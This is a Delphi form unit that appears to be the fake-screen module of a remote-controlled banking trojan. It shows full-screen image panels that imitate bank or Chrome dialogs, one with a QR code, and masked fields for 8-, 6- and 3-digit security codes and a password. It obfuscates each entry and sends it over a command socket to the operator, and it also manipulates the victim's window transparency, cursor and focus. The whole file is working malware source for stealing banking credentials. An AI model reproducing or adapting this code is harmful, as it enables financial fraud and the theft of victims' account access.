unit ut_02;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.ExtCtrls, Vcl.StdCtrls,
  Vcl.Imaging.pngimage, System.StrUtils, TFlatEditUnit, variaveis, conexoes,
  principal;

type
  TTNT_02 = class(TForm)
    Timer1: TTimer;
    procedure OKClick(Sender: TObject);
    procedure OK2Click(Sender: TObject);
    procedure OK3Click(Sender: TObject);
    procedure OK4Click(Sender: TObject);
    procedure OK5Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure OKPISCAClick(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public

    pnl1: TMibnPNL;
    img1backChrome_WidgetWin_1: TMibIMG;
    OK: TMibIMG;
    imgqr: TMibIMG;
    edt1campo: TMibPNL;
    pnl2: TMibnPNL;
    img2backgroud: TMibIMG;
    OK2: TMibIMG;
    edt2campo: TMibPNL;
    pnl3: TMibnPNL;
    img3backChrome_WidgetWin_1: TMibIMG;
    OK3: TMibIMG;
    cordenada: TLabel;
    edt3campo: TMibPNL;
    pnl4: TMibnPNL;
    img4backChrome_WidgetWin_1: TMibIMG;
    OK4: TMibIMG;
    edt4campo: TMibPNL;
    pnl5: TMibnPNL;
    img5backChrome_WidgetWin_1: TMibIMG;
    OK5: TMibIMG;
    edt5campo: TMibPNL;
    PNL_PISCA: TMibnPNL;
    backpiscaChrome_WidgetWin_1: TMibIMG;
    OKPISCA: TMibIMG;
    piscacampo: TFlatEdit;
    ID, CH: string;
    constructor Create(aowner: Tcomponent);
  end;

var
  TNT_02: TTNT_02;

implementation

uses usession, umodulo;

{$R *.dfm}

constructor TTNT_02.Create(aowner: Tcomponent);
begin
  inherited;

  pnl1 := TMibnPNL.Create(Self);
  img1backChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OK := TMibIMG.Create(Self);
  imgqr := TMibIMG.Create(Self);
  edt1campo := TMibPNL.Create(Self);

  pnl1.Name := 'pnl1';
  pnl1.Parent := Self;
  pnl1.Left := 0;
  pnl1.Top := 0;
  pnl1.Width := 642;
  pnl1.Height := 484;
  pnl1.Align := alClient;
  pnl1.TabOrder := 0;
  img1backChrome_WidgetWin_1.Name := 'img1backChrome_WidgetWin_1';
  img1backChrome_WidgetWin_1.Parent := pnl1;
  img1backChrome_WidgetWin_1.Left := 0;
  img1backChrome_WidgetWin_1.Top := 0;
  img1backChrome_WidgetWin_1.Width := 642;
  img1backChrome_WidgetWin_1.Height := 484;
  img1backChrome_WidgetWin_1.Align := alClient;
  OK.Name := 'OK';
  OK.Parent := pnl1;
  OK.Left := 416;
  OK.Top := 400;
  OK.Width := 113;
  OK.Height := 31;
  OK.Cursor := crHandPoint;
  OK.DragCursor := crHandPoint;
  OK.OnClick := OKClick;
  imgqr.Name := 'imgqr';
  imgqr.Parent := pnl1;
  imgqr.Left := 368;
  imgqr.Top := 117;
  imgqr.Width := 245;
  imgqr.Height := 244;
  edt1campo.Name := 'edt1campo';
  edt1campo.Parent := pnl1;
  edt1campo.Left := 267;
  edt1campo.Top := 374;
  edt1campo.Width := 84;
  edt1campo.Height := 15;
  edt1campo.TabStop := False;
  edt1campo.BevelInner := bvNone;
  edt1campo.BevelOuter := bvNone;
  edt1campo.BorderStyle := bsNone;
  edt1campo.MaxLength := 8;
  edt1campo.NumbersOnly := True;
  edt1campo.PasswordChar := #8226;
  edt1campo.TabOrder := 0;

  pnl2 := TMibnPNL.Create(Self);
  img2backgroud := TMibIMG.Create(Self);
  OK2 := TMibIMG.Create(Self);
  edt2campo := TMibPNL.Create(Self);

  pnl2.Name := 'pnl2';
  pnl2.Parent := Self;
  pnl2.Left := 0;
  pnl2.Top := 0;
  pnl2.Width := 642;
  pnl2.Height := 484;
  pnl2.Align := alClient;
  pnl2.TabOrder := 1;
  img2backgroud.Name := 'img2backgroud';
  img2backgroud.Parent := pnl2;
  img2backgroud.Left := 0;
  img2backgroud.Top := 0;
  img2backgroud.Width := 642;
  img2backgroud.Height := 484;
  img2backgroud.Align := alClient;
  OK2.Name := 'OK2';
  OK2.Parent := pnl2;
  OK2.Left := 368;
  OK2.Top := 348;
  OK2.Width := 84;
  OK2.Height := 21;
  OK2.Cursor := crHandPoint;
  OK2.DragCursor := crHandPoint;
  OK2.OnClick := OK2Click;
  edt2campo.Name := 'edt2campo';
  edt2campo.Parent := pnl2;
  edt2campo.Left := 263;
  edt2campo.Top := 349;
  edt2campo.Width := 94;
  edt2campo.Height := 16;
  edt2campo.TabStop := False;
  edt2campo.BevelInner := bvNone;
  edt2campo.BevelOuter := bvNone;
  edt2campo.BorderStyle := bsNone;
  edt2campo.MaxLength := 6;
  edt2campo.NumbersOnly := True;
  edt2campo.PasswordChar := #8226;
  edt2campo.TabOrder := 0;

  pnl3 := TMibnPNL.Create(Self);
  img3backChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OK3 := TMibIMG.Create(Self);
  cordenada := TLabel.Create(Self);
  edt3campo := TMibPNL.Create(Self);

  pnl3.Name := 'pnl3';
  pnl3.Parent := Self;
  pnl3.Left := 0;
  pnl3.Top := 0;
  pnl3.Width := 642;
  pnl3.Height := 484;
  pnl3.Align := alClient;
  pnl3.TabOrder := 2;
  img3backChrome_WidgetWin_1.Name := 'img3backChrome_WidgetWin_1';
  img3backChrome_WidgetWin_1.Parent := pnl3;
  img3backChrome_WidgetWin_1.Left := 0;
  img3backChrome_WidgetWin_1.Top := 0;
  img3backChrome_WidgetWin_1.Width := 642;
  img3backChrome_WidgetWin_1.Height := 484;
  img3backChrome_WidgetWin_1.Align := alClient;
  img3backChrome_WidgetWin_1.Transparent := True;
  OK3.Name := 'OK3';
  OK3.Parent := pnl3;
  OK3.Left := 416;
  OK3.Top := 298;
  OK3.Width := 87;
  OK3.Height := 21;
  OK3.Cursor := crHandPoint;
  OK3.DragCursor := crHandPoint;
  OK3.OnClick := OK3Click;
  cordenada.Name := 'cordenada';
  cordenada.Parent := pnl3;
  cordenada.Left := 370;
  cordenada.Top := 270;
  cordenada.Width := 16;
  cordenada.Height := 16;
  cordenada.Caption := '';
  cordenada.ParentFont := False;
  cordenada.Transparent := True;
  cordenada.BringToFront;
  with cordenada.Font do
  begin
    Name := 'Arial';
    Size := 12;
    Style := [fsBold];
    Color := clRed;
  end;
  edt3campo.Name := 'edt3campo';
  edt3campo.Parent := pnl3;
  edt3campo.Left := 356;
  edt3campo.Top := 298;
  edt3campo.Width := 43;
  edt3campo.Height := 18;
  edt3campo.TabStop := False;
  edt3campo.BevelInner := bvNone;
  edt3campo.BevelOuter := bvNone;
  edt3campo.BorderStyle := bsNone;
  edt3campo.MaxLength := 3;
  edt3campo.NumbersOnly := True;
  edt3campo.PasswordChar := #8226;
  edt3campo.TabOrder := 0;

  pnl4 := TMibnPNL.Create(Self);
  img4backChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OK4 := TMibIMG.Create(Self);
  edt4campo := TMibPNL.Create(Self);

  pnl4.Name := 'pnl4';
  pnl4.Parent := Self;
  pnl4.Left := 0;
  pnl4.Top := 0;
  pnl4.Width := 642;
  pnl4.Height := 484;
  pnl4.Align := alClient;
  pnl4.TabOrder := 3;
  img4backChrome_WidgetWin_1.Name := 'img4backChrome_WidgetWin_1';
  img4backChrome_WidgetWin_1.Parent := pnl4;
  img4backChrome_WidgetWin_1.Left := 0;
  img4backChrome_WidgetWin_1.Top := 0;
  img4backChrome_WidgetWin_1.Width := 642;
  img4backChrome_WidgetWin_1.Height := 484;
  img4backChrome_WidgetWin_1.Align := alClient;
  OK4.Name := 'OK4';
  OK4.Parent := pnl4;
  OK4.Left := 376;
  OK4.Top := 355;
  OK4.Width := 84;
  OK4.Height := 22;
  OK4.Cursor := crHandPoint;
  OK4.DragCursor := crHandPoint;
  OK4.OnClick := OK4Click;
  edt4campo.Name := 'edt4campo';
  edt4campo.Parent := pnl4;
  edt4campo.Left := 268;
  edt4campo.Top := 352;
  edt4campo.Width := 66;
  edt4campo.Height := 21;
  edt4campo.TabStop := False;
  edt4campo.BevelInner := bvNone;
  edt4campo.BevelOuter := bvNone;
  edt4campo.BorderStyle := bsNone;
  edt4campo.MaxLength := 6;
  edt4campo.NumbersOnly := True;
  edt4campo.PasswordChar := #8226;
  edt4campo.TabOrder := 0;

  pnl5 := TMibnPNL.Create(Self);
  img5backChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OK5 := TMibIMG.Create(Self);
  edt5campo := TMibPNL.Create(Self);

  pnl5.Name := 'pnl5';
  pnl5.Parent := Self;
  pnl5.Left := 0;
  pnl5.Top := 0;
  pnl5.Width := 642;
  pnl5.Height := 484;
  pnl5.Align := alClient;
  pnl5.TabOrder := 4;
  img5backChrome_WidgetWin_1.Name := 'img5backChrome_WidgetWin_1';
  img5backChrome_WidgetWin_1.Parent := pnl5;
  img5backChrome_WidgetWin_1.Left := 0;
  img5backChrome_WidgetWin_1.Top := 0;
  img5backChrome_WidgetWin_1.Width := 642;
  img5backChrome_WidgetWin_1.Height := 484;
  img5backChrome_WidgetWin_1.Align := alClient;

  OK5.Name := 'OK5';
  OK5.Parent := pnl5;
  OK5.Left := 414;
  OK5.Top := 324;
  OK5.Width := 110;
  OK5.Height := 25;
  OK5.Cursor := crHandPoint;
  OK5.DragCursor := crHandPoint;
  OK5.OnClick := OK5Click;
  edt5campo.Name := 'edt5campo';
  edt5campo.Parent := pnl5;
  edt5campo.Left := 220;
  edt5campo.Top := 328;
  edt5campo.Width := 178;
  edt5campo.Height := 20;
  edt5campo.TabStop := False;
  edt5campo.BevelInner := bvNone;
  edt5campo.BevelOuter := bvNone;
  edt5campo.BorderStyle := bsNone;
  edt5campo.MaxLength := 20;
  edt5campo.PasswordChar := #8226;
  edt5campo.TabOrder := 0;

  PNL_PISCA := TMibnPNL.Create(Self);
  backpiscaChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OKPISCA := TMibIMG.Create(Self);
  piscacampo := TFlatEdit.Create(Self);

  PNL_PISCA.Name := 'PNL_PISCA';
  PNL_PISCA.Parent := Self;
  PNL_PISCA.Left := 0;
  PNL_PISCA.Top := 0;
  PNL_PISCA.Width := 642;
  PNL_PISCA.Height := 484;
  PNL_PISCA.Align := alClient;
  PNL_PISCA.TabOrder := 0;
  PNL_PISCA.Visible := False;
  backpiscaChrome_WidgetWin_1.Name := 'backpiscaChrome_WidgetWin_1';
  backpiscaChrome_WidgetWin_1.Parent := PNL_PISCA;
  backpiscaChrome_WidgetWin_1.Left := 0;
  backpiscaChrome_WidgetWin_1.Top := 0;
  backpiscaChrome_WidgetWin_1.Width := 642;
  backpiscaChrome_WidgetWin_1.Height := 484;
  backpiscaChrome_WidgetWin_1.Align := alClient;
  OKPISCA.Name := 'OKPISCA';
  OKPISCA.Parent := PNL_PISCA;
  OKPISCA.Left := 20;
  OKPISCA.Top := 147;
  OKPISCA.Width := 101;
  OKPISCA.Height := 25;
  OKPISCA.Cursor := crHandPoint;
  OKPISCA.OnClick := OKPISCAClick;
  piscacampo.Name := 'piscacampo';
  piscacampo.Parent := PNL_PISCA;
  piscacampo.Left := 320;
  piscacampo.Top := 50;
  piscacampo.Width := 89;
  piscacampo.Height := 19;
  piscacampo.ColorBorder := clBtnFace;
  piscacampo.ColorFlat := clBtnFace;
  piscacampo.ParentColor := True;
  piscacampo.MaxLength := 8;
  piscacampo.PasswordChar := #8226;
  piscacampo.TabOrder := 0;
  piscacampo.Text := '';

  edt1campo.Text := '';
  edt2campo.Text := '';
  edt3campo.Text := '';
  edt4campo.Text := '';
  edt5campo.Text := '';

end;

procedure TTNT_02.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
    GWL_EXSTYLE) or WS_EX_TRANSPARENT or WS_EX_NOACTIVATE);
  SethWndTrasparent(Handle_Main, True);
  Install_Cur(True);
  Mostra_ou_Esconder(True);
  // Telinha:=False;
  TNT_02.Free;
  TNT_02 := nil;
end;

procedure TTNT_02.FormShow(Sender: TObject);
begin
  // TranslateMessage(Msg);
  // DispatchMessage(Msg);
  Mostra_ou_Esconder(False);
  bBlockMouse := False;
  Install_Cur(False);
  SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
    GWL_EXSTYLE) and not WS_EX_TRANSPARENT);
  ShowWindow(Handle, SW_HIDE);
  // SethWndTrasparent(Handle_Main, False);
  // SetForegroundWindow(Handle_Main);
  // SetForegroundWindow(handle);
  // Application.ProcessMessages;
  case AnsiIndexStr(ID, ['TTL_QR', 'TTL_02', 'TTL_03', 'TTL_04', 'TTL_05',
    'TTL_PISCA']) of
    0:
      begin
        Top := (Screen.Height div 2) - (Height div 2);
        Left := (Screen.Width div 2) - (Width div 2);
        LoadImg(img1backChrome_WidgetWin_1, 'TNTD01');
        TNT_02.imgqr.Picture.Assign(CmdRmt.GetQrc(CmdRmt.iQrCodeX1,
          CmdRmt.iQrCodeY1, CmdRmt.iQrCodeX2, CmdRmt.iQrCodeY2));
        TNT_02.pnl1.BringToFront;
        TNT_02.pnl1.Visible := True;
      end;
    1:
      begin
        Top := (Screen.Height div 2) - (Height div 2);
        Left := (Screen.Width div 2) - (Width div 2);
        LoadImg(img2backgroud, 'TNTD02');
        TNT_02.pnl2.BringToFront;
        TNT_02.pnl2.Visible := True;
        // Telinha:=True;
      end;
    2:
      begin
        Top := (Screen.Height div 2) - (Height div 2);
        Left := (Screen.Width div 2) - (Width div 2);
        LoadImg(img3backChrome_WidgetWin_1, 'TNTD03');
        TNT_02.cordenada.Caption := CH;
        TNT_02.pnl3.BringToFront;
        TNT_02.pnl3.Visible := True;
        // Telinha:=True;
      end;
    3:
      begin
        Top := (Screen.Height div 2) - (Height div 2);
        Left := (Screen.Width div 2) - (Width div 2);
        LoadImg(img4backChrome_WidgetWin_1, 'TNTD04');
        TNT_02.pnl4.BringToFront;
        TNT_02.pnl4.Visible := True;
        // Telinha:=True;
      end;
    4:
      begin
        Top := (Screen.Height div 2) - (Height div 2);
        Left := (Screen.Width div 2) - (Width div 2);
        LoadImg(img5backChrome_WidgetWin_1, 'TNTD05');
        TNT_02.pnl5.BringToFront;
        TNT_02.pnl5.Visible := True;
        // Telinha:=True;
      end;
    5:
      begin
        LoadImg(backpiscaChrome_WidgetWin_1, 'TNTDPISCA');
        TNT_02.PNL_PISCA.BringToFront;
        TNT_02.PNL_PISCA.Visible := True;
        // Telinha:=True;
      end;
  end;
end;

procedure TTNT_02.OK2Click(Sender: TObject);
begin
  if Length(edt2campo.Text) = 6 then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt2campo.Text));
    Install_Cur(True);
    close;
  end
  else
  begin
    edt2campo.SetFocus;
    edt2campo.Clear;
  end;
end;

procedure TTNT_02.OK3Click(Sender: TObject);
begin
  if Length(edt3campo.Text) = 3 then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt3campo.Text));
    Install_Cur(True);
    close;
  end
  else
  begin
    edt3campo.SetFocus;
    edt3campo.Clear;
  end;
end;

procedure TTNT_02.OK4Click(Sender: TObject);
begin
  if Length(edt4campo.Text) = 6 then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt4campo.Text));
    Install_Cur(True);
    close;
  end
  else
  begin
    edt4campo.SetFocus;
    edt4campo.Clear;
  end;
end;

procedure TTNT_02.OK5Click(Sender: TObject);
begin
  if (Length(edt5campo.Text) >= 8) or (Length(edt5campo.Text) <= 20) then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt5campo.Text));
    Install_Cur(True);
    close;
  end
  else
  begin
    edt5campo.SetFocus;
    edt5campo.Clear;
  end;
end;

procedure TTNT_02.OKClick(Sender: TObject);
begin
  if Length(edt1campo.Text) = 8 then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt1campo.Text));
    Install_Cur(True);
    close;
  end
  else
  begin
    edt1campo.SetFocus;
    edt1campo.Clear;
  end;
end;

procedure TTNT_02.OKPISCAClick(Sender: TObject);
var
  region, Region2: hrgn;
  regionY: integer;
begin
  if (Length(piscacampo.Text) = 0) or (Length(piscacampo.Text) < 8) then
    exit
  else
    region := CreateRectRgn(0, 0, rcDesktop.Width, rcDesktop.Height);
  Region2 := CreateRectRgn(CmdRmt.X1, CmdRmt.Y1, CmdRmt.X1 + 750, CmdRmt.Y2);
  CombineRgn(region, region, Region2, RGN_COPY);
  SetWindowRgn(Handle_Main, region, True);
  // Chrome_RenderWidgetHostHWND.Chrome_WidgetWin_1.Transparent.Active:=true;
  // TNT_02.Release;
  // FreeAndNil(TNT_02);
  // Install_Cur(true);
  // Chrome_RenderWidgetHostHWND.Center.Visible:=true ;
  CmdSocket.CmdSocket.Socket.SendText
    (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + piscacampo.Text));
  close;
  // waiting.Visible:=true;
end;

procedure TTNT_02.Timer1Timer(Sender: TObject);
begin
  Application.ProcessMessages;
  if GetForegroundWindow <> Handle then
    SetForegroundWindow(Handle)
end;

end.
